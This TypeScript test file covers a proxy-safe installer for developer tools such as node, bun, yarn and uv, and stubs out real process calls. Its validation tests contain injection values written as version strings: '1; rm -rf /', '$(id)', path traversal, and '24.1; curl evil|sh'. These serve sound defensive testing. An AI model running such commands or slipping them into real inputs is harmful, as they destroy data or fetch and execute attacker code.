/**
 * @file Tests for the proxy-safe tool installers, using a recording `Run`.
 */
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";
import {
  INSTALLERS,
  curlNodeIndex,
  installTools,
  isValidRequest,
  nodeArch,
  pathLine,
  resolveNodeVersion,
  resolveVersions,
  toolBinDirs,
} from "../src/installers.ts";
import type { NodeRelease } from "../src/installers.ts";

/** One recorded process call. */
interface Call {
  cmd: string;
  args: string[];
  env?: NodeJS.ProcessEnv;
}

/**
 * Builds a `Run` that records calls instead of spawning.
 *
 * @returns The recorder and its calls.
 */
function recorder(): { calls: Call[]; run: (cmd: string, args: string[], opts?: { env?: NodeJS.ProcessEnv }) => Promise<void> } {
  const calls: Call[] = [];
  return {
    calls,
    run: async (cmd, args, opts) => {
      calls.push({ cmd, args, env: opts?.env });
    },
  };
}

/**
 * Creates an empty temp tools directory.
 *
 * @returns Its path.
 */
function toolsDir(): string {
  const dir = mkdtempSync(join(tmpdir(), "installers-"));
  created.push(dir);
  return dir;
}

/** Temp directories to remove when the tests finish. */
const created: string[] = [];

after(() => {
  for (const dir of created) rmSync(dir, { recursive: true, force: true });
});

const ARCH = process.arch === "arm64" ? "arm64" : "x64";

test("node installs from nodejs.org through bash", async () => {
  const dir = toolsDir();
  const { calls, run } = recorder();
  const results = await installTools({ node: "24.14.1" }, dir, run, { PATH: "/usr/bin" });
  const target = join(dir, "node-24.14.1");
  assert.equal(results.length, 1);
  assert.equal(results[0]?.name, "node 24.14.1");
  assert.equal(results[0]?.ok, true);
  assert.deepEqual(calls[0]?.cmd, "bash");
  assert.deepEqual(calls[0]?.args, [
    "-c",
    'set -o pipefail; curl -fsSL -- "$1" | tar -xJ -C "$2" --strip-components=1',
    "_",
    `https://nodejs.org/dist/v24.14.1/node-v24.14.1-linux-${ARCH}.tar.xz`,
    target,
  ]);
});

test("nodeArch maps x64 and arm64 and rejects the rest", () => {
  assert.equal(nodeArch("x64"), "x64");
  assert.equal(nodeArch("arm64"), "arm64");
  assert.throws(() => nodeArch("ia32"), /unsupported architecture/);
});

test("bun uses the pinned node npm at the front of PATH", async () => {
  const dir = toolsDir();
  const { calls, run } = recorder();
  const results = await installTools({ node: "24.14.1", bun: "1.4.2" }, dir, run, { PATH: "/usr/bin" });
  assert.deepEqual(results.map((r) => r.name), ["node 24.14.1", "bun 1.4.2"]);
  const bun = calls[1];
  const prefix = join(dir, "bun-1.4.2");
  assert.equal(bun?.cmd, "npm");
  assert.deepEqual(bun?.args, ["install", "--prefix", prefix, "--no-save", "--no-audit", "--no-fund", "bun@1.4.2"]);
  assert.equal(bun?.env?.PATH, `${join(dir, "node-24.14.1", "bin")}:/usr/bin`);
});

test("bun without pinned node uses the npm already on PATH", async () => {
  const dir = toolsDir();
  const { calls, run } = recorder();
  await installTools({ bun: "1.4.2" }, dir, run, { PATH: "/usr/bin" });
  assert.equal(calls[0]?.env?.PATH, "/usr/bin");
});

test("an installed tool is skipped and produces no result", async () => {
  const dir = toolsDir();
  const bin = INSTALLERS.bun.binDir(dir, "1.4.2");
  mkdirSync(bin, { recursive: true });
  writeFileSync(join(bin, "bun"), "");
  const { calls, run } = recorder();
  const results = await installTools({ bun: "1.4.2" }, dir, run, { PATH: "/usr/bin" });
  assert.deepEqual(calls, []);
  assert.deepEqual(results, []);
});

test("yarn 4 installs @yarnpkg/cli-dist and yarn 1 installs yarn", async () => {
  const dir = toolsDir();
  const four = recorder();
  await installTools({ yarn: "4.1.0" }, dir, four.run, { PATH: "/usr/bin" });
  assert.equal(four.calls[0]?.args.at(-1), "@yarnpkg/cli-dist@4.1.0");
  const one = recorder();
  await installTools({ yarn: "1.22.22" }, dir, one.run, { PATH: "/usr/bin" });
  assert.equal(one.calls[0]?.args.at(-1), "yarn@1.22.22");
});

test("uv installs with pip into its directory", async () => {
  const dir = toolsDir();
  const { calls, run } = recorder();
  await installTools({ uv: "0.5.0" }, dir, run, { PATH: "/usr/bin" });
  assert.equal(calls[0]?.cmd, "python3");
  assert.deepEqual(calls[0]?.args, ["-m", "pip", "install", "--target", join(dir, "uv-0.5.0"), "uv==0.5.0"]);
  assert.equal(INSTALLERS.uv.binDir(dir, "0.5.0"), join(dir, "uv-0.5.0", "bin"));
});

test("a failing install becomes a failed result, not a rejection", async () => {
  const dir = toolsDir();
  const results = await installTools({ deno: "2.0.0" }, dir, async () => {
    throw new Error("network down");
  }, { PATH: "/usr/bin" });
  assert.equal(results[0]?.ok, false);
  assert.equal(results[0]?.error, "network down");
});

test("pathLine lists bin dirs in tool order with a literal $PATH", () => {
  assert.equal(
    pathLine(toolBinDirs({ bun: "1.4.2", node: "24.14.1" }, "/t")),
    'export PATH="/t/node-24.14.1/bin:/t/bun-1.4.2/node_modules/.bin:$PATH"',
  );
  assert.equal(pathLine([]), "");
});

test("invalid versions fail without running anything or creating directories", async () => {
  for (const versions of [{ node: "1; rm -rf /" }, { node: "24.1$(id)" }, { bun: "-g" }, { uv: "../x" }]) {
    const dir = toolsDir();
    const { calls, run } = recorder();
    const results = await installTools(versions, dir, run, { PATH: "/usr/bin" });
    const [tool, version] = Object.entries(versions)[0] ?? [];
    assert.deepEqual(calls, []);
    assert.equal(results.length, 1);
    assert.equal(results[0]?.ok, false);
    assert.equal(results[0]?.error, `invalid version for ${tool}: ${version}`);
    assert.deepEqual(readdirSync(dir), []);
    assert.equal(existsSync(join(dir, "..", "x")), false);
  }
});

test("the layout refuses a bad version instead of building a path", () => {
  assert.throws(() => INSTALLERS.uv.dir("/t", "../x"), /invalid version for uv/);
  assert.throws(() => INSTALLERS.bun.binDir("/t", "-g"), /invalid version for bun/);
});

test("toolBinDirs skips invalid versions", () => {
  assert.deepEqual(toolBinDirs({ node: "24.1; curl evil|sh", bun: "1.4.2" }, "/t"), ["/t/bun-1.4.2/node_modules/.bin"]);
  assert.deepEqual(toolBinDirs({ node: "$(id)" }, "/t"), []);
});

/** Fake Node.js release index, newest first like the real one, with one entry out of order. */
const INDEX: NodeRelease[] = [
  { version: "v25.1.0", lts: false },
  { version: "v24.14.1", lts: "Krypton" },
  { version: "v22.12.0", lts: "Jod" },
  { version: "v22.1.5", lts: false },
  { version: "v22.1.0", lts: false },
  { version: "v20.18.1", lts: "Iron" },
  { version: "v20.19.0", lts: "Iron" },
  { version: "v20.3.0", lts: false },
];

test("resolveNodeVersion picks the newest match for prefixes and aliases", () => {
  assert.equal(resolveNodeVersion("22", INDEX), "22.12.0");
  assert.equal(resolveNodeVersion("22.1", INDEX), "22.1.5");
  assert.equal(resolveNodeVersion("20", INDEX), "20.19.0");
  assert.equal(resolveNodeVersion("lts/iron", INDEX), "20.19.0");
  assert.equal(resolveNodeVersion("lts/Jod", INDEX), "22.12.0");
  assert.equal(resolveNodeVersion("lts/*", INDEX), "24.14.1");
  assert.equal(resolveNodeVersion("node", INDEX), "25.1.0");
  assert.equal(resolveNodeVersion("2", INDEX), undefined);
  assert.equal(resolveNodeVersion("lts/argon", INDEX), undefined);
});

test("node aliases are accepted for node only", () => {
  for (const alias of ["lts/iron", "lts/*", "node"]) assert.ok(isValidRequest("node", alias), alias);
  assert.ok(!isValidRequest("bun", "lts/iron"));
  assert.ok(!isValidRequest("node", "lts/../x"));
  assert.ok(!isValidRequest("node", "lts/"));
  assert.throws(() => INSTALLERS.node.dir("/t", "lts/iron"), /invalid version for node/);
});

/**
 * Builds a `Run` that serves a release index to curl's `-o` file and records the calls.
 *
 * @param index - Index to write, or undefined to fail like a blocked download.
 * @returns The recorder and its calls.
 */
function indexServer(index: NodeRelease[] | undefined): { calls: Call[]; run: (cmd: string, args: string[], opts?: { env?: NodeJS.ProcessEnv }) => Promise<void> } {
  const calls: Call[] = [];
  return {
    calls,
    run: async (cmd, args, opts) => {
      calls.push({ cmd, args, env: opts?.env });
      if (cmd !== "curl") return;
      if (!index) throw new Error("curl exited with code 56");
      writeFileSync(args[args.indexOf("-o") + 1] ?? "", JSON.stringify(index));
    },
  };
}

test("resolveVersions downloads the index with curl argv and resolves a partial node", async () => {
  const { calls, run } = indexServer(INDEX);
  const env = { HTTPS_PROXY: "http://proxy:3128" };
  const { resolved, results } = await resolveVersions({ node: "22", bun: "1.4.2" }, curlNodeIndex(run, env));
  assert.deepEqual(resolved, { node: "22.12.0", bun: "1.4.2" });
  assert.deepEqual(results, []);
  assert.equal(calls.length, 1);
  assert.equal(calls[0]?.cmd, "curl");
  assert.equal(calls[0]?.args.at(-1), "https://nodejs.org/dist/index.json");
  assert.equal(calls[0]?.env, env);
  const file = calls[0]?.args[(calls[0]?.args.indexOf("-o") ?? 0) + 1] ?? "";
  assert.equal(existsSync(file), false);
});

test("resolveVersions skips the download for exact versions", async () => {
  const { calls, run } = indexServer(INDEX);
  const { resolved } = await resolveVersions({ node: "24.14.1" }, curlNodeIndex(run, {}));
  assert.deepEqual(resolved, { node: "24.14.1" });
  assert.deepEqual(calls, []);
});

test("an unresolvable node is one failed step and is left out", async () => {
  for (const [requested, index, error] of [
    ["lts/argon", INDEX, "no node release matches lts/argon"],
    ["22", undefined, "curl exited with code 56"],
  ] as const) {
    const { run } = indexServer(index);
    const { resolved, results } = await resolveVersions({ node: requested, pnpm: "9.0.0" }, curlNodeIndex(run, {}));
    assert.deepEqual(resolved, { pnpm: "9.0.0" });
    assert.equal(results.length, 1);
    assert.equal(results[0]?.name, `node ${requested}`);
    assert.equal(results[0]?.ok, false);
    assert.equal(results[0]?.error, error);
  }
});

test("a resolved partial node installs into node-<exact> and toolBinDirs maps to it", async () => {
  const dir = toolsDir();
  const server = indexServer(INDEX);
  const { resolved } = await resolveVersions({ node: "lts/iron" }, curlNodeIndex(server.run, {}));
  const { calls, run } = recorder();
  const results = await installTools(resolved, dir, run, { PATH: "/usr/bin" });
  assert.equal(results[0]?.name, "node 20.19.0");
  assert.equal(calls[0]?.args.at(-1), join(dir, "node-20.19.0"));
  assert.deepEqual(toolBinDirs({ node: "lts/iron" }, dir, resolved), [join(dir, "node-20.19.0", "bin")]);
  assert.deepEqual(toolBinDirs({ node: "lts/iron" }, dir), []);
  assert.deepEqual(toolBinDirs({ node: "22" }, dir, { node: "20.19.0" }), [], "a stale resolution is not used");
});

test("installTools refuses a node version that was not resolved", async () => {
  const dir = toolsDir();
  const { calls, run } = recorder();
  const results = await installTools({ node: "22" }, dir, run, { PATH: "/usr/bin" });
  assert.deepEqual(calls, []);
  assert.equal(results[0]?.ok, false);
  assert.deepEqual(readdirSync(dir), []);
});
